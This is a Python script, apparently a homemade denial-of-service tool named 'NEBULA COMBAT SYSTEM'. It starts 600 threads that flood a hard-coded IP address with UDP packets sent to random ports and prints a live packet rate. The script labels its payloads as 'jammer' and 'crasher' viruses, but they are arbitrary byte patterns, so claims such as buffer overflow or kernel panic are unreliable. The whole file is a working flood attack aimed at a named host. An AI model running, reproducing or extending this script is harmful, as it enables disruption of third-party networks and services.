import socket
import threading
import time
import random

# TARGET
target = "62.109.121.42"

# COLORS
MAGENTA = '\033[95m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

# NEBULA SYMBOLS
STAR = f"{MAGENTA}✧{RESET}"
DATA_STAR = f"{CYAN}✦{RESET}"
JAMMER_STAR = f"{YELLOW}✧{RESET}"
CRASHER_STAR = f"{RED}✧{RESET}"

# HEAVY SIGNAL JAMMING VIRUS PAYLOADS
VIRUS_JAMMERS = [
    # 1. HIGH-FREQUENCY JAMMER (HFJ) - 64 bytes
    bytes([0x48, 0x46, 0x4A, 0x31] + [random.randint(0x80, 0xFF) for _ in range(60)]),
    
    # 2. LOW-FREQUENCY JAMMER (LFJ) - 64 bytes  
    bytes([0x4C, 0x46, 0x4A, 0x31] + [random.randint(0x00, 0x3F) for _ in range(60)]),
    
    # 3. PATTERN JAMMER (PATJ) - 64 bytes
    bytes([0x50, 0x41, 0x54, 0x4A] + [0xAA, 0x55] * 30),
    
    # 4. CLOCK JAMMER (CLKJ) - 64 bytes
    bytes([0x43, 0x4C, 0x4B, 0x4A] + [0xFF, 0x00] * 30),
    
    # 5. RANDOM NOISE JAMMER (RNJ) - 64 bytes
    bytes([0x52, 0x4E, 0x4A, 0x31] + [random.randint(0, 255) for _ in range(60)]),
    
    # 6. SYNCHRONIZATION JAMMER (SYNJ) - 64 bytes
    bytes([0x53, 0x59, 0x4E, 0x4A] + 
          [0x7E] * 8 + [0x55] * 8 + [0xAA] * 44),
    
    # 7. CARRIER JAMMER (CRRJ) - 64 bytes
    bytes([0x43, 0x52, 0x52, 0x4A] + [0xFF] * 60),
    
    # 8. MODULATION JAMMER (MODJ) - 64 bytes
    bytes([0x4D, 0x4F, 0x44, 0x4A] + [i % 256 for i in range(60)]),
]

# HEAVY CRASHER VIRUS PAYLOADS
VIRUS_CRASHERS = [
    # 1. NULL POINTER CRASHER (NULC) - 64 bytes
    bytes([0x4E, 0x55, 0x4C, 0x43] + [0x00] * 60),
    
    # 2. MAX POINTER CRASHER (MAXC) - 64 bytes
    bytes([0x4D, 0x41, 0x58, 0x43] + [0xFF] * 60),
    
    # 3. BUFFER OVERFLOW CRASHER (BUFC) - 128 bytes
    bytes([0x42, 0x55, 0x46, 0x43] + 
          [0x41] * 100 + 
          [0x90] * 8 + 
          [0xCC] * 8 + 
          [0xEB, 0xFE, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90] +
          [0x42] * (128 - 4 - 100 - 8 - 8 - 8)),
    
    # 4. STACK SMASHING CRASHER (STKC) - 128 bytes
    bytes([0x53, 0x54, 0x4B, 0x43] + 
          [0x43] * 60 + 
          [0x00] * 8 + 
          [0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE] +
          [0x44] * (128 - 4 - 60 - 8 - 8)),
    
    # 5. HEAP CORRUPTION CRASHER (HEPC) - 128 bytes
    bytes([0x48, 0x45, 0x50, 0x43] + 
          list(b"HEAPHEAP") + 
          [0x45] * 80 + 
          list(b"FREEFREE") + 
          list(b"MALLOCMA") +
          [0x46] * (128 - 4 - 8 - 80 - 8 - 8)),
    
    # 6. KERNEL PANIC CRASHER (KERC) - 96 bytes
    bytes([0x4B, 0x45, 0x52, 0x43] + 
          list(b"KERNELPA") + 
          list(b"NIC!\x00\x00\x00\x00") + 
          [0x0D, 0xF0, 0xAD, 0x0B, 0x0D, 0xF0, 0xAD, 0x0B] +
          [0xCA, 0xFE, 0xBA, 0xBE, 0xCA, 0xFE, 0xBA, 0xBE] +
          [0x47] * (96 - 4 - 8 - 8 - 8 - 8)),
    
    # 7. DIVIDE BY ZERO CRASHER (DIVC) - 80 bytes
    bytes([0x44, 0x49, 0x56, 0x43] + 
          [0x00] * 8 + 
          [0xFF] * 8 + 
          [0x7F] + [0xFF] * 7 + 
          [0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00] +
          [0x48] * (80 - 4 - 8 - 8 - 8 - 8)),
    
    # 8. MEMORY LEAK CRASHER (MEMC) - 128 bytes
    bytes([0x4D, 0x45, 0x4D, 0x43] + 
          list(b"LEAKLEAK") + 
          list(b"ALLOCALL") + 
          list(b"OCNEVERF") + 
          list(b"REEEEEEE") +
          [0x49] * (128 - 4 - 8 - 8 - 8 - 8)),
]

# COMBINE ALL PAYLOADS
VIRUS_PAYLOADS = VIRUS_JAMMERS + VIRUS_CRASHERS

# STATS
stats_lock = threading.Lock()
total_packets = 0
total_bytes = 0
jammers_sent = 0
crashers_sent = 0
running = True

# THREAD COUNT
THREAD_COUNT = 600

def virus_attack(thread_id):
    global total_packets, total_bytes, jammers_sent, crashers_sent
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while running:
        try:
            # Select deadly payload
            payload = random.choice(VIRUS_PAYLOADS)
            
            # Check if it's a jammer or crasher
            is_jammer = payload[:4] in [b"HFJ1", b"LFJ1", b"PATJ", b"CLKJ", b"RNJ1", b"SYNJ", b"CRRJ", b"MODJ"]
            
            # Random target port
            port = random.randint(1, 65535)
            
            # LAUNCH VIRUS
            sock.sendto(payload, (target, port))
            
            with stats_lock:
                total_packets += 1
                total_bytes += len(payload)
                if is_jammer:
                    jammers_sent += 1
                else:
                    crashers_sent += 1
                    
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

def format_bytes(bytes_count):
    """Convert bytes to KB/MB/GB"""
    if bytes_count >= 1024*1024*1024:  # GB
        return f"{bytes_count/(1024*1024*1024):.2f}GB"
    elif bytes_count >= 1024*1024:  # MB
        return f"{bytes_count/(1024*1024):.2f}MB"
    elif bytes_count >= 1024:  # KB
        return f"{bytes_count/1024:.2f}KB"
    else:
        return f"{bytes_count}B"

# START NEBULA ATTACK
print(f"\n{STAR} {MAGENTA}NEBULA COMBAT SYSTEM{RESET} {STAR}")
print(f"{STAR} Target: {YELLOW}{target}{RESET}")
print(f"{STAR} Threads: {GREEN}{THREAD_COUNT}{RESET}")
print(f"{STAR} Jammers: {YELLOW}{len(VIRUS_JAMMERS)}{RESET} | Crashers: {RED}{len(VIRUS_CRASHERS)}{RESET}")
print(f"{STAR} Total Viruses: {CYAN}{len(VIRUS_PAYLOADS)}{RESET}")
print(f"{STAR} {'─'*50}")

# LAUNCH THREADS
for i in range(THREAD_COUNT):
    t = threading.Thread(target=virus_attack, args=(i,))
    t.daemon = True
    t.start()

# NEBULA LOGGING
last_time = time.time()
try:
    while True:
        time.sleep(1)
        current = time.time()
        elapsed = current - last_time
        last_time = current
        
        with stats_lock:
            pps = int(total_packets / elapsed) if elapsed > 0 else 0
            data_rate = total_bytes / elapsed if elapsed > 0 else 0
            
            # Calculate percentages
            total = jammers_sent + crashers_sent
            jam_percent = (jammers_sent / total * 100) if total > 0 else 0
            crash_percent = (crashers_sent / total * 100) if total > 0 else 0
            
            # Format data rate
            data_formatted = format_bytes(data_rate)
            
            # NEBULA LOG LINE
            print(f"{STAR} {MAGENTA}NEBULA{RESET}: {GREEN}{pps:,}{RESET}pps {DATA_STAR} {data_formatted}/s {JAMMER_STAR} {jam_percent:.1f}% {CRASHER_STAR} {crash_percent:.1f}%")
            
            # Reset counters
            total_packets = 0
            total_bytes = 0
            jammers_sent = 0
            crashers_sent = 0
            
except KeyboardInterrupt:
    running = False
    print(f"\n{STAR} {MAGENTA}NEBULA TERMINATED{RESET} {STAR}")
